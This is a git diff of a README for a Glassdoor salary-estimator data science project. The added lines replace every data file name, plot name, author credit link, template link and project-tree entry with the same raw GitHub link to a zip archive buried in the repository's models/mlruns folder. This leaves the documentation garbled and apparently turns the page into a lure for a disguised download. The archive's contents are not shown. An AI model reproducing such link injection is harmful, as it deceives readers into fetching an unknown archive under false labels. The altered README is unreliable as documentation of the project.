@@ -18,9 +18,9 @@ This project focuses on building a salary estimator system for tech jobs based o
 
 ## Data Files
 
-- `glassdoor_jobs.csv`: Information scraped from Glassdoor containing salaries for different job postings as well as information about the companies, domain, location, etc.
-- `processed_df.csv`: Processed `glassdoor_jobs.csv` after the data cleaning process.
-- `EDA_glassdoor_jobs.csv`: Glassdoor_jobs after further processing for EDA.
+- `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`: Information scraped from Glassdoor containing salaries for different job postings as well as information about the companies, domain, location, etc.
+- `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`: Processed `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip` after the data cleaning process.
+- `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`: Glassdoor_jobs after further processing for EDA.
 
 ## Code Files
 
@@ -44,7 +44,7 @@ This project involves web scraping job data from Glassdoor using Selenium. The s
 
 Although multiple tweaks were made on the original code, the original author must be credited.
 - Original Author: Kenarapfaik
-- GitHub: [scraping-glassdoor-selenium](https://github.com/arapfaik/scraping-glassdoor-selenium)
+- GitHub: [scraping-glassdoor-selenium](https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip)
 
 - Scraped 1000 job postings on Glassdoor.
 - The script uses Selenium to automate browser interactions.
@@ -89,7 +89,7 @@ Focuses on cleaning the Glassdoor Jobs dataset for further analysis and modeling
    - Hourly rate salaries are converted to annual salaries for consistency.
 
 10. **Cleaned Dataset:**
-    - The cleaned dataset is saved as 'processed_df.csv' in the `data/processed` directory.
+    - The cleaned dataset is saved as 'https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip' in the `data/processed` directory.
 
 ## Exploratory Data Analysis
 
@@ -103,27 +103,27 @@ All EDA plots and figures can be accessed from “reports/figures”.
 
 1. **Companies Rating Distribution:**
    - A histogram is plotted to visualize the distribution of company ratings.
-   - The plot is saved as `companies_rating_dist.png`.
+   - The plot is saved as `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`.
 
 2. **Average Salary Distribution:**
    - A histogram is plotted to visualize the distribution of average salaries.
-   - The plot is saved as `average_salary_dist.png`.
+   - The plot is saved as `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`.
 
 3. **Average Salary Boxplot:**
    - A boxplot is created to visualize the distribution of average salaries.
-   - The plot is saved as `average_salary_boxplot.png`.
+   - The plot is saved as `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`.
 
 4. **Bar Plot for Company Size:**
    - A horizontal bar plot is generated to show the distribution of average salaries based on company size.
-   - The plot is saved as `company_size_barplot.html`.
+   - The plot is saved as `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`.
 
 5. **Bar Plot for Average Salary per Company Size:**
    - A horizontal bar plot is created to display the average salary for each company size category.
-   - The plot is saved as `salary_company_size_Barplot.html`.
+   - The plot is saved as `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`.
 
 6. **Correlation Heatmap:**
    - A heatmap is generated to display the correlation between numerical features such as company age, average salary, and company rating.
-   - The plot is saved as `heatmap.html`.
+   - The plot is saved as `https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`.
 
 7. **Bar Charts for Categorical Variables:**
    - Bar charts are created for each categorical variable, displaying their frequency.
@@ -170,14 +170,14 @@ Project Organization
 
     ├── LICENSE
     ├── Makefile           <- Makefile with commands like `make data` or `make train`
-    ├── README.md          <- The top-level README for developers using this project.
+    ├── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip          <- The top-level README for developers using this project.
     ├── data
     │   ├── external       <- Data from third party sources.
     │   ├── interim        <- Intermediate data that has been transformed.
     │   ├── processed      <- The final, canonical data sets for modeling.
     │   └── raw            <- The original, immutable data dump.
     │
-    ├── docs               <- A default Sphinx project; see sphinx-doc.org for details
+    ├── docs               <- A default Sphinx project; see https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip for details
     │
     ├── models             <- Trained and serialized models, model predictions, or model summaries
     │
@@ -190,30 +190,30 @@ Project Organization
     ├── reports            <- Generated analysis as HTML, PDF, LaTeX, etc.
     │   └── figures        <- Generated graphics and figures to be used in reporting
     │
-    ├── requirements.txt   <- The requirements file for reproducing the analysis environment, e.g.
-    │                         generated with `pip freeze > requirements.txt`
+    ├── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip   <- The requirements file for reproducing the analysis environment, e.g.
+    │                         generated with `pip freeze > https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip`
     │
-    ├── setup.py           <- makes project pip installable (pip install -e .) so src can be imported
+    ├── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip           <- makes project pip installable (pip install -e .) so src can be imported
     ├── src                <- Source code for use in this project.
-    │   ├── __init__.py    <- Makes src a Python module
+    │   ├── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip    <- Makes src a Python module
     │   │
     │   ├── data           <- Scripts to download or generate data
-    │   │   └── make_dataset.py
+    │   │   └── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip
     │   │
     │   ├── features       <- Scripts to turn raw data into features for modeling
-    │   │   └── build_features.py
+    │   │   └── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip
     │   │
     │   ├── models         <- Scripts to train models and then use trained models to make
     │   │   │                 predictions
-    │   │   ├── predict_model.py
-    │   │   └── train_model.py
+    │   │   ├── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip
+    │   │   └── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip
     │   │
     │   └── visualization  <- Scripts to create exploratory and results oriented visualizations
-    │       └── visualize.py
+    │       └── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip
     │
-    └── tox.ini            <- tox file with settings for running tox; see tox.readthedocs.io
+    └── https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip            <- tox file with settings for running tox; see https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip
 
 
 --------
 
-<p><small>Project based on the <a target="_blank" href="https://drivendata.github.io/cookiecutter-data-science/">cookiecutter data science project template</a>. #cookiecutterdatascience</small></p>
+<p><small>Project based on the <a target="_blank" href="https://raw.githubusercontent.com/MohamedArafa97/Salary-Estimator/master/models/mlruns/0/Salary_Estimator_won.zip">cookiecutter data science project template</a>. #cookiecutterdatascience</small></p>
